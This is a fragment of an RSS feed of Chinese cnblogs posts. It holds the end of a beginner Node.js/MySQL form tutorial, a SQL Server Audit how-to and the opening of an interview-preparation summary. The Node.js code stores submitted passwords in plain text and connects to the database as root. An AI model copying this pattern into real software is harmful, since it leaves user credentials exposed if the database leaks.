&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;form &lt;/span&gt;&lt;span&gt;&amp;lt;!--action&lt;/span&gt;&lt;span&gt;=&quot;http://127.0.0.1:8888/process_post&quot;&lt;/span&gt;&lt;span&gt; method&lt;/span&gt;&lt;span&gt;=&quot;post&quot;&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;span&gt;&amp;gt; &amp;gt; //这里我隐藏了表单提交的两个参数，&lt;br/&gt;　　　　　　　　　　　　　　　　　　        我用了ajax，如果不用ajax直接就填写路径参数和请求方式就可以了&lt;/span&gt;&lt;span&gt;
       name: &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;names&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;br/&gt;&lt;/span&gt;       password: &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;password&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;passwords&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
       &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;myForm&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;button&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;submit&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;form&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
            $(&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;() {
                $(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.myForm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).on(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;click&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;() {  //添加点击事件
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; names &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; $(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;input:nth-of-type(1)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).val();   //获取两个的参数
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; passwords &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; $(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;input:nth-of-type(2)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).val();
                    $.post(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://127.0.0.1:8888/process_post&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, { //jq的post方法
                        names: names,
                        passwords: passwords
                    }, &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(res) {
                        alert(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;提交成功&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                    })
                })
            })
        &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174307966-989118230.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;提交成功并且数据库有内容&lt;/p&gt;
&lt;p&gt; 这是cmd的提交打印的方法，这里是数据库连接方法打印的，等下后面说&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174339997-880887638.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174418184-457422168.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174434059-652392472.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图是数据库刚添加的&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt; 4&lt;/strong&gt;.Node.js+MySql 获得数据写入数据库&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;后台没有数据库怎么算是后台呢，获取了数据存入数据库才算完整，说起来之前我是完全没玩过数据库&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;为了nodejs才学的，其实也不难，首先安装MySql，直接百度下载然后安装就好了&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;安装之后首先要打开数据库服务，然后cmd打开，我们小测试一下&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175027763-447888751.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;打开安装好的数据库命令行文件，然后输入密码，安装时输入的root密码，看到下面这些就代表可以使用了&lt;/p&gt;
&lt;p&gt;但是有个问题，用cmd写数据库还是很麻烦的，所以我们需要一个可视化软件，当然小编比较懒才用的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175157856-590268653.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下载数据库可视化软件&lt;/p&gt;
&lt;p&gt;页面是这样的，这里已经建好了一张表，当然首先要连接数据库，数据库教程大家可以去网上看看，也是狠多的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175228434-1060374395.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面开始写&lt;/p&gt;
&lt;p&gt;当然我们还是需要引入模块，首先安装&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
$ cnpm install mysql
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;72&quot;&gt;
&lt;pre readability=&quot;31&quot;&gt;
&lt;br/&gt;这里因为只需要添加数据于是我就注释了其他方法，这个方法就加载刚才的js里面，这里也是一个方法，添加参数&lt;p&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;數據庫鏈接方法&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;mysql_connec();&lt;/span&gt;
  
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;數據庫鏈接方法&lt;/span&gt;
  &lt;span&gt;function&lt;/span&gt;&lt;span&gt; mysql_connec(name,pas) {

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;鏈接數據庫&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; mysql = require(&quot;mysql&quot;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; connection =&lt;span&gt; mysql.createConnection({  //配置参数，然后添加你的数据库里面的表
        host: &lt;/span&gt;'localhost'&lt;span&gt;,
        user: &lt;/span&gt;'root'&lt;span&gt;,
        password: &lt;/span&gt;'*********'&lt;span&gt;,
        database: &lt;/span&gt;'xmibear'&lt;span&gt;
    })

    connection.connect();  //连接

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;查詢語句&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    var selectSql = &quot;select * from formtable&quot;;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    connection.query(selectSql, function(err, res) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        if(err) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            console.log('[select error]-', err.message);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            return;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        }&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n\n----------查詢語句-----------------------\n&quot;);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(res);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n----------查詢語句ENDENDNEDNED-----------&quot;);&lt;/span&gt;&lt;span&gt;
//
//&lt;/span&gt;&lt;span&gt;    })&lt;/span&gt;

    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;插入數據&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; addSql = &quot;insert into formtable(id,name,password) values(0,?,?)&quot;&lt;span&gt;; //存放数据库语言的，这里是添加
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; addParmas =&lt;span&gt; [name, pas];
    connection.query(addSql, addParmas, &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(err, res) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(err) {
            console.log(&lt;/span&gt;&quot;[insert error]-&quot;&lt;span&gt;, err.message);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }&lt;br/&gt;//cmd打印内容
        console.log(&lt;/span&gt;&quot;\n\n----------插入數據-----------------------\n&quot;&lt;span&gt;);
        console.log(res);
        console.log(&lt;/span&gt;&quot;\n----------插入數據ENDENDNEDNED-----------&quot;&lt;span&gt;);

    })

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;更新數據&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    var upSql = &quot;update formtable set name=?,password=? where id=?&quot;;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    var upParmas = [&quot;劉王婆&quot;, &quot;55555&quot;, 1];&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    connection.query(upSql, upParmas, function(err, res) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        if(err) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            console.log(&quot;[updata error]-&quot;, err.message);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            return;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        }&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n\n----------更新數據-----------------------\n&quot;);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(res);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n----------更新數據ENDENDNEDNED-----------&quot;);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    })&lt;/span&gt;
&lt;/p&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后运行文件&lt;/p&gt;
&lt;p&gt;在前台html提交的时候cmd就会打印，这时候数据已经存进数据库了，刷新就看到了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175739450-1221310192.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;到这里及说完了，但是很多东西还是要自己试试才知道，当然我觉得不是很难，入门还是可以的&lt;/p&gt;

</description>
<pubDate>Thu, 09 Nov 2017 10:00:00 +0000</pubDate>
<dc:creator>小熊一乐</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mibear/p/nodejs.html</dc:identifier>
</item>
<item>
<title>SQL Server 审计 - 悦光阴</title>
<link>http://www.cnblogs.com/ljhdo/p/5721668.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ljhdo/p/5721668.html</guid>
<description>&lt;p&gt;审计（Audit）用于追踪和记录SQL Server实例或数据库中发生的事件，审计主要包括审计对象（Audit）和审计规范（Audit Specification），创建审计首先需要创建一个SQL Server 实例级的审计对象，然后，创建从属于它的“服务器审计规范”或“数据库审计规范”。审计数据可以输出到审计文件（File）、安全日志（Security Log）和应用程序日志（Application Log）。&lt;/p&gt;
&lt;p&gt;启用审计的目的一般是为了监控SQL Server执行的操作，例如，记录什么人在什么时候查询数据、修改数据，登陆SQL Server实例等，由于审计记录的数据有可能很丰富，因此，启用审计可能产生大量的日志数据，占用磁盘的大量空间。审计使用一句话来概括就是：记录谁在什么时候做了什么事，审计对象（Audit）定义：配置数据存在何处，而审计规范（Audit Specification）定义：记录什么事，一旦特定的事件触发，SQL Server引擎就使用审计记录事件发生的现场信息。&lt;/p&gt;
&lt;p&gt;创建和使用审计的一般步骤是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;step1：创建服务器级别的审计对象，并启用审计对象；&lt;/li&gt;
&lt;li&gt;step2：创建审计规范，并映射到审计对象审核，启用审计规范，审计对象开始追踪和记录数据；&lt;/li&gt;
&lt;li&gt;step3：查看审计数据，可以通过使用SSMS的”Log Files Viewer“或函数sys.fn_get_audit_file 查看记录的日志数据。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;一，创建审计对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先创建服务器级别的审计对象，展开&quot;Security&quot;，右击Audits，通过“New Audit”，打开“Create Audit”窗体开始创建审计对象，审计输出的数据保存到“Audit destination”中，本文选择File，把数据存储到审计文件中，其他类型是：Security Log和Application Log。Queue delay是指数据写入到审计文件的延迟，默认是1s。审计对象的作用是指定审计数据保存的路径，以及写入数据的延迟和数据文件的大小，审计对象主要是存储审计规范的数据。&lt;/p&gt;
&lt;p&gt;根据硬盘空间的限制，设置审计对象的属性 Audit File maximum Limit、Maximum File size、以及Reserve disk space，控制审计文件的大小，管理硬盘空间的使用，避免硬盘爆掉。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/628084/201711/628084-20171109160313575-1036257878.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;创建的审计对象默认是禁用（Disable）的，在使用审计对象之前，必须启用，选中新建的审计对象，右击，选中“Enable Audit”。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二，创建服务器级别的审计规范&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;展开Security，选中“Server Audit Specifications”，右击弹出快捷菜单，选择“New Server Audit Specifications”，打开“Create Server Audit Specifications”的窗体，通过UI创建审计规范：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/628084/201711/628084-20171109161815325-995051939.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;审计规范指定审计对象记录的事件类型，在审计规范中指定的事件类型，SQL Server 一旦检测到事件发生，就会把跟该事件相关的信息写入到审计对象指定的文件中，保存起来，以便于后续的检查（review）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1，添加审计操作组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 创建审计规范，选择审计对象，从Audit Action Type列表中选择审计操作组，创建的审计规范默认是禁用的，选中新建的审计规范，右击弹出快捷菜单，选中”Enable Server Audit Specifications “启用：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/628084/201711/628084-20171109163612372-587789644.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从&lt;span data-ttu-id=&quot;7c4d1-101&quot;&gt;审核操作类型列表中选择审计操作组，审计操作组是审计记录的事件操作类型，常用的审计操作组是： &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;DATABASE_OBJECT_ACCESS_GROUP：访问数据库对象时将引发此事件；&lt;/li&gt;
&lt;li&gt;DATABASE_OBJECT_CHANGE_GROUP：&lt;span data-ttu-id=&quot;b9026-162&quot;&gt;针对数据库对象（如架构）执行 CREATE、ALTER 或 DROP 语句时将引发此事件。 &lt;span data-ttu-id=&quot;b9026-163&quot;&gt;创建、更改或删除任何数据库对象时均将引发此事件。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;DATABASE_OPERATION_GROUP：&lt;span data-ttu-id=&quot;b9026-175&quot;&gt;数据库中发生操作（如检查点或订阅查询通知）时将引发此事件。 &lt;span data-ttu-id=&quot;b9026-176&quot;&gt;对于任何数据库的任何操作都将引发此事件。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;FAILED_DATABASE_AUTHENTICATION_GROUP：&lt;span data-ttu-id=&quot;b9026-206&quot;&gt;指示某个主体尝试登录到数据库并且失败。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;FAILED_LOGIN_GROUP：指示主体尝试登录到 &lt;span data-ttu-id=&quot;7c4d1-101&quot;&gt;SQL Server ，但是失败。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span data-ttu-id=&quot;7c4d1-101&quot;&gt;SUCCESSFUL_LOGIN_GROUP：指示主体已成功登录到 &lt;span data-ttu-id=&quot;7c4d1-101&quot;&gt;SQL Server。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;2，查看审计数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;点击审计对象，右击弹出快捷菜单，点击”View Audit Logs“查看审计对象记录的数据：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/628084/201711/628084-20171109164210388-96415445.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;或者通过TSQL 函数查看审计数据，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;sys.fn_get_audit_file ( file_pattern,   
    { &lt;/span&gt;&lt;span&gt;default&lt;/span&gt; &lt;span&gt;|&lt;/span&gt; initial_file_name &lt;span&gt;|&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt; },   
    { &lt;/span&gt;&lt;span&gt;default&lt;/span&gt; &lt;span&gt;|&lt;/span&gt; audit_record_offset &lt;span&gt;|&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt; } )  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;审计文件名由四部分组成：AuditName_GUID_n_m.sqlaudit，第一个参数是file_pattern，包括路径和文件名，对于文件名，可以通过特殊的匹配符指定：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;*：表示所有的字符；&lt;/li&gt;
&lt;li&gt;{}：指定GUID；&lt;/li&gt;
&lt;li&gt;如果文件名以扩展名( .&lt;span&gt;sqlaudit）结尾，表示查看特定的文件； &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; 例如，查看所有的审计文件的数据：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; sys.fn_get_audit_file(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;E:\AuditFiles\*&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;default&lt;/span&gt;,&lt;span&gt;default&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;三，创建数据库级别的审计规范&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在数据库的Security中右击“Database Audit Specifications”，数据库级别的审计操作组，大部分和服务器级别的审计操作组很相似，除了数据库级别的审计动作（Database-Level Audit Actions），在数据库对象上发生以下操作（Action）时，记录事件的信息：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;SELECT&lt;/li&gt;
&lt;li&gt;UPDATE&lt;/li&gt;
&lt;li&gt;INSERT&lt;/li&gt;
&lt;li&gt;DELETE&lt;/li&gt;
&lt;li&gt;EXECUTE&lt;/li&gt;
&lt;li&gt;REFERENCES&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;lf-text-block lf-block x-hidden-focus&quot; data-lf-anchor-id=&quot;c9614c4db5fb6cbd224fa0f5f1c1e333:0&quot;&gt;数据库级别的审计操作追踪和记录的是数据库对象（schema，objects）上发生的事件，因此必须配置Object Class、Object Schema，Object Name 和 Principal Name字段：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/628084/201711/628084-20171109170935278-796771506.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看审计数据，选中Server级别的审计对象，通过”View Audit Logs“查看记录的日志数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;四，维护审计&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建审计很简单，DBA需要更多关注的是审计数据的维护&lt;/p&gt;
&lt;p&gt;略，后续补充&lt;/p&gt;

&lt;p&gt;参考文档：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/lyhabc/p/4074003.html&quot; target=&quot;_blank&quot;&gt;SQLSERVER2008新增的审核/审计功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine&quot; target=&quot;_blank&quot;&gt;SQL Server Audit (Database Engine)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-action-groups-and-actions&quot; target=&quot;_blank&quot;&gt;SQL Server Audit Action Groups and Actions&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-get-audit-file-transact-sql&quot; target=&quot;_blank&quot;&gt;sys.fn_get_audit_file (Transact-SQL)&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 09:43:00 +0000</pubDate>
<dc:creator>悦光阴</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ljhdo/p/5721668.html</dc:identifier>
</item>
<item>
<title>面试经典算法题集锦——《剑指 offer》小结 - .....?</title>
<link>http://www.cnblogs.com/fanling999/p/7810558.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fanling999/p/7810558.html</guid>
<description>&lt;p&gt;从今年 3 月份开始准备找实习，到现在校招结束，申请的工作均为机器学习／数据挖掘算法相关职位，也拿到了几个 sp offer。经历这半年的洗礼，自己的综合能力和素质都得到了一个质的提升。&lt;/p&gt;
&lt;p&gt;实话说对于未来去哪里，即将如何发展还没有清晰的规划。迷茫总是会有的，但这并不是停止脚步的理由。找工作是在漫长的职业生涯中时常出现的转折点，而学习和和积累是终生的任务。这里不打算对这一段时间的各项细节和收获展开太多讨论，后续将会专门进行整理。&lt;/p&gt;
&lt;p&gt;本文主要是对《剑指 offer》这本面试经典进行一个小结，也是未来继续坚持刷题的一个开端。&lt;/p&gt;
&lt;p&gt;在准备面试过程中手写 bug free 代码的环节是必不可少的。本人并非 ACM 出身，虽说在学校基础课程学得还不错，但对于刷题并无太多经验，一开始还是吃力的。慢慢的发现这一过程还是挺有意思的，虽然校招找工作已结束，但这刷算法题会成为我新的爱好。最近将《剑指 offer》这本经典的面试宝典梳理了一遍，并实现和整理了书中的所有题目，并在“牛客网”上提交测试以保证代码的正确性。&lt;/p&gt;
&lt;p&gt;平时有时间也可以刷一刷 &lt;a href=&quot;https://leetcode.com/&quot;&gt;leetcode&lt;/a&gt;，&lt;a href=&quot;https://hihocoder.com/&quot;&gt;hihocoder&lt;/a&gt;，很多题目思考起来还是很有意思的。对于其他的课本，我觉得《算法导论》《编程珠玑》《编程之美》都是不错的经典教材，如果以后有时间也会一一对这几本书进行总结。&lt;/p&gt;
&lt;p&gt;对于刷题，谈谈我的几点感受：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;熟练一门编程语言很重要，这决定了你能不能将 idea 尽快实现并印证。在一开始可以先写一些 easy 的题，主要是将自己的编程语言练熟。本人主要使用 c++ 实现，其实算法涉及的结构不是很多，stl 基本就可以很好的 cover。&lt;/li&gt;
&lt;li&gt;凡事开头难，坚持总是会有收获的。我建议刷题要有一个持续的过程，不要间断，最好一段时间集中攻克一件事情。比如 x 天完成一本书，或者一块内容，这样有助于集中精力突破。如果三天打鱼两天晒网，每次捡起来都很吃力，会形成恶性循环。题目刷多了以后会培养出感觉和思考问题的思路。&lt;/li&gt;
&lt;li&gt;无论简单与否都要思考清楚再开始写代码。分析题目时可以将问题进行分解，还可以借助实例，做图抽象等方法帮助理解。&lt;/li&gt;
&lt;li&gt;注意细节，写 bug free 的代码（应该成为一种追求）。实现代码过程中应该分析好输入输出，考虑好特殊情况和边界条件等。比如字符串转换成整数需要考虑：不合法输入，溢出等情况。使用指针时刻注意是否为空的判断等。&lt;/li&gt;
&lt;li&gt;优美，鲁棒的高质量代码。不仅仅是追求完成功能，还应该对代码的布局，变量名见名见意，关键边界条件的检查等。代码是程序员交流的语言，因此应该写得&lt;strong&gt;优美&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;重复检查，人脑 debug。无论是否在手写代码的环境中，写完代码都应该养成重复 review 的习惯，自己跑几个测试用例，确定没有问题之后再把你代码交给面试官。&lt;/li&gt;
&lt;li&gt;没有完美的代码，注意沟通完成满足需求的代码。每一个程序都可以看成是输入到输出的映射过程，而输入和输出总是有很多可能的，我们一个程序不可能 cover 掉大千世界，函数 function，也可以叫做“功能”，即完成一定任务的函数，这就需要我们通过沟通去了解用户的意图，将问题抽象，并基于某些假设去完成这样的 function。&lt;/li&gt;
&lt;li&gt;解决问题的方法总是多样的。不管是做题还是平时练习，在完成任务的基础上应该还要发散性思考，一个题目的不同解法，相似题目的解法，相似场景的结局等。&lt;/li&gt;
&lt;li&gt;一味的 practice，还要适时的总结和 review 才能及时的查漏补缺，让自己能更好的成长。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;下面是课本中的一些总结，其实主要是经典语录。由于本人平时很喜欢记录一些大师／大神们的话，因此在总结中也是重点摘抄了很多大牛们的切身感悟和体验。有时候看看不仅是一种学习更是一种前人的激励。&lt;/p&gt;

&lt;h2 id=&quot;面试官谈面试&quot;&gt;面试官谈面试：&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;“对于初级程序员，我一般会偏向考察算法和数据结构，看应聘者的基本功；对于高级程序员，我会多关注专业技能和项目经验”——何幸杰（SAP，高级工程师）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;“应聘者要事先做好准备，对公司近况、项目情况有所了解，对所应聘的工作真的很有热情。另外，应聘者还要准备好合适的问题问面试官。”——韩伟东（盛大，高级研究员）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“应聘者在面试过程首先要放松，不要过于紧张，这有助于后面解决问题时开拓思路。其次不要急于编写代码，应该先了解清楚所要解决的问题。这时候最好先和面试官多做沟通，然后开始做一些整体的设计和规划，这有助于编写高质量和高可读性的代码。写完代码后不要马上提交，最后自己review并借助一些测试用例来走几遍代码，找出可能出现的错误。”—— 尧敏（淘宝，资深经历）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;“‘神马’，都是浮云，应聘技术岗位就是要踏实写程序。”——田超（微软，SDE II）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;面试&quot;&gt;面试&lt;/h2&gt;
&lt;h3 id=&quot;面试的三种形式&quot;&gt;面试的三种形式：&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;strong&gt;1.电话面试&lt;/strong&gt;（听不清楚时要敢于说pardon）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;strong&gt;2.共享桌面远程面试&lt;/strong&gt;（最关心的应聘者的编程习惯以及调试能力，几种编程习惯：思考清楚再开始编码，良好的代码命名和缩进对齐习惯，能够单元测试。）&lt;/p&gt;
&lt;/blockquote&gt;
